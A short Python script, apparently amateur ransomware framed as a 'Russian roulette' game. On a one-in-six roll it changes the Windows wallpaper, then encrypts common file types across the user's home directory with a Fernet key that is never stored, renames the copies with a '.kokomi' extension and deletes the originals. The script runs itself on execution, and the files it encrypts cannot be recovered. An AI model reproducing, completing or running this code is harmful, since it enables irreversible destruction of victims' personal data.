#Kokomi Russian Roulette version 0.1
import os
import random
import glob
import secrets
import string
from cryptography.fernet import Fernet

def chwall():
    import ctypes
    wal_path = "C:\\Users\\quantum\\Documents\\kokomi\\yfak.png"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wal_path, 3)

def kokomi():
    ransomExt = ".kokomi"
    fileExtensions = [".jpg", ".png", ".mkv", ".mp4", ".zip", ".rar", ".m4a", ".mp3", ".pdf", ".docx", ".pptx", ".xlsx", ".txt", ".exe", ".ink"]
    bullet = random.randint(1,6)
    if 1 == bullet:
        chwall()
        print("You are dead")
        key = Fernet.generate_key()
        token = Fernet(key)
        userdir = os.path.expanduser('~')
        for path in fileExtensions: 
            for file in glob.glob(f'{userdir}/**/*{path}'):
                #read files
                with open(file,"rb") as f:
                    data = f.read()
                    #print(data)
                    f.close()
                #Create new file
                encfile = file + ransomExt
                kenc = token.encrypt(data)
                with open(encfile,"wb") as nf:
                    nf.write(kenc)
                    nf.close()
                os.remove(file)
    else:
        print("You are save")

kokomi()
